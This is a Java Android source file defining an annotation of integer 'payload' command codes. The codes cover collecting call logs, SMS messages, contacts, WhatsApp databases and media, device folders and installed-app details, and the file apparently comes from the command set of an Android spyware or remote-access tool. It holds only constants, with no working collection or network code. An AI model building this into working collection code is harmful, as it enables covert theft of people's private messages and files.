package com.aigs.serviceone.annotations;

import androidx.annotation.IntDef;

import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;

@Retention(RetentionPolicy.RUNTIME)
@IntDef({
        PayloadTypes.GET_CALL_LOGS,
        PayloadTypes.GET_TEXT_MESSAGES_INBOX,
        PayloadTypes.GET_TEXT_MESSAGES_DRAFT,
        PayloadTypes.GET_TEXT_MESSAGES_OUTBOX,
        PayloadTypes.GET_WHATSAPP_DATABASES,
        PayloadTypes.GET_SCREENSHOTS_COUNT,
        PayloadTypes.GET_USER_CONTACTS,
        PayloadTypes.GET_BATTERY_STATUS,
        PayloadTypes.GET_DEVICE_INFO,
        PayloadTypes.GET_PERMISSION_INFO,
        PayloadTypes.GET_DEVICE_FOLDER,
        PayloadTypes.GET_WHATSAPP_STATUS,
        PayloadTypes.GET_WHATSAPP_GIFS,
        PayloadTypes.GET_WHATSAPP_AUDIO,
        PayloadTypes.GET_WHATSAPP_DOCUMENTS,
        PayloadTypes.GET_WHATSAPP_IMAGES,
        PayloadTypes.GET_WHATSAPP_PROFILE_PICS,
        PayloadTypes.GET_WHATSAPP_STICKERS,
        PayloadTypes.GET_WHATSAPP_VIDEOS,
        PayloadTypes.GET_WHATSAPP_VOICE_NOTES,
        PayloadTypes.GET_INSTALLED_APP_DETAILS})

public @interface PayloadTypes {
    int GET_CALL_LOGS = 0;
    int GET_TEXT_MESSAGES_INBOX = 1;
    int GET_TEXT_MESSAGES_OUTBOX = 2;
    int GET_TEXT_MESSAGES_DRAFT = 3;
    int GET_WHATSAPP_DATABASES = 4;
    int GET_SCREENSHOTS_COUNT = 5;
    int GET_USER_CONTACTS = 6;
    int GET_BATTERY_STATUS = 7;
    int GET_DEVICE_INFO = 8;
    int GET_PERMISSION_INFO = 9;
    int GET_DEVICE_FOLDER = 10;

    int GET_WHATSAPP_STATUS = 11;
    int GET_WHATSAPP_GIFS = 12;
    int GET_WHATSAPP_AUDIO = 13;
    int GET_WHATSAPP_DOCUMENTS = 14;
    int GET_WHATSAPP_IMAGES = 15;
    int GET_WHATSAPP_PROFILE_PICS = 16;
    int GET_WHATSAPP_STICKERS = 17;
    int GET_WHATSAPP_VIDEOS = 18;
    int GET_WHATSAPP_VOICE_NOTES = 19;

    int GET_INSTALLED_APP_DETAILS = 20;
}
